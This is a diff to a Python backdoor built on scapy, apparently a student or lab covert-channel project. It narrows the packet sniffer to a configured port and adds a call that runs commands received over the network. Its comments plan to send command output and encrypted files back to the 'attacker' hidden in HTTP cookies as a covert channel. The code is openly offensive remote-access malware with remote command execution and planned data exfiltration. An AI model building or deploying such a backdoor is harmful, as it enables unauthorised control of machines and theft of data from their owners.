@@ -206,7 +206,7 @@ def start_backdoor():
     IPAddr = socket.gethostbyname(hostname)
 
     # Start sniffing, callback function to process each packet.
-    sniff(prn=process_sniff_pkt, filter="udp", store=0)
+    sniff(prn=process_sniff_pkt, filter=f"udp dst port {config.receiver_port}", store=0)
     # sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth)
 
 
@@ -283,6 +283,9 @@ def process_sniff_pkt(pkt):
             instruction_input = commands[3]
             print(instruction)
             print(instruction_input)
+            result = run_commands(instruction_input)
+            # encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
+            # send_command_output(encrypted_data, address, sender_port)
         if instruction == "4":
             instruction_input = commands[3]
             print(instruction)
@@ -353,8 +356,16 @@ def send_command_output(data, address, port):
     :return: None
     """
 
-    # Add short delay ensuring sender socket is ready.
+    # Add short delay ensuring attacker sniff is ready.
     time.sleep(0.5)
+
+    # copy fake easy 3 way handshake for scapy
+    # create HTTP REST PORT request, with data encrypted and hidden as covert channel
+    # store packet order curr 1/100 as cookies
+    # store file name/extension as cookies too
+    # store password as cookie too??? maybe not for now
+    # if file too big, break into parts, and send as payload
+    # can prob encrypt whole file, read as binary then send, recombine easily with cookie info, then decrypt
 
     # IPv4 Socket connection to receiver.
     with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as my_sock:
